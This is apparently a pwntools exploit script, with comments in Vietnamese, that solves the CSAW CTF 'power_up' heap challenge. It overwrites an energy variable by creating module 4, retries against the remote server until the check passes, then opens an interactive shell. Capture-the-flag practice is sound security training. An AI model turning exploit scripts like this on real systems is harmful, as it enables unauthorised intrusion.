from pwn import *

# Cấu hình môi trường
context.binary = elf = ELF('./power_up')
context.log_level = 'info'

def solve():
    # Vòng lặp vô hạn, thử cho đến khi thành công
    while True:
        try:
            p = remote('chals.ctf.csaw.io', 21005, timeout=5)

            # Kịch bản tấn công duy nhất có lý và không bị crash
            log.info("Attempting solution: create_module(4) to overwrite energy.")
            
            # 1. Ghi một con trỏ heap vào modules[4] (và cả energy)
            p.sendlineafter(b'>> ', b'1')
            p.sendlineafter(b'Index: ', b'4')
            p.sendlineafter(b'Size: ', b'4112') # 0x1010
            p.sendlineafter(b'Data: ', b'Hoping for a lucky heap address')

            # 2. Thử kích hoạt Power Up
            p.sendlineafter(b'>> ', b'4')
            
            # 3. Kiểm tra kết quả
            response = p.recvline(timeout=2)

            if b'The core is still dead' in response:
                log.warning("Failed. Heap address was unlucky. Retrying...")
                p.close()
                continue # Thử lại từ đầu
            else:
                log.success("Success! The check passed!")
                print(response.decode())
                p.interactive()
                break # Thoát vòng lặp

        except (EOFError, PwnlibException) as e:
            log.error(f"Connection error: {e}. Retrying...")
            # Không cần p.close() vì kết nối đã mất
            time.sleep(1) # Chờ một chút trước khi thử lại

# Bắt đầu quá trình
solve()